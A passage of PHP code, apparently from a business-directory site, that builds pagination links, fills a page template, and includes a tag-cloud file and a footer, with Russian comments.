	else $next_page = '<a href="'.$def_mainlocation.'/index.php?cat='.$cat.'&subcat='.$subcat.'&subsubcat='.$subsubcat.'&page='.($kPage+1).'"><b>'.$def_next.'</b></a>&nbsp;';
        }
        
        include ( "./template/$def_template/pages.php" ); // подключаем обработку страниц
        
        $template_page_news = set_tFile('pages.tpl');

        $template_pages = new Template;

        $template_pages->load($template_page_news);

        $template_pages->replace("prev", $prev_page);
        $template_pages->replace("next", $next_page);
        $template_pages->replace("page", $page_news);

        $template_pages->replace("path_to_images", $def_mainlocation . "/template/" . $def_template . "/images");

        $template_pages->publish(); 
        
}

main_table_bottom();

echo '<div style="text-align:left; padding: 0 5px">'.$def_company_cat.' - '.$results_amount_1[fcounter].'</div>';

include ( "./includes/tag_firms.php" ); // подключаем облако тегов

include ( "./template/$def_template/footer.php" );

?>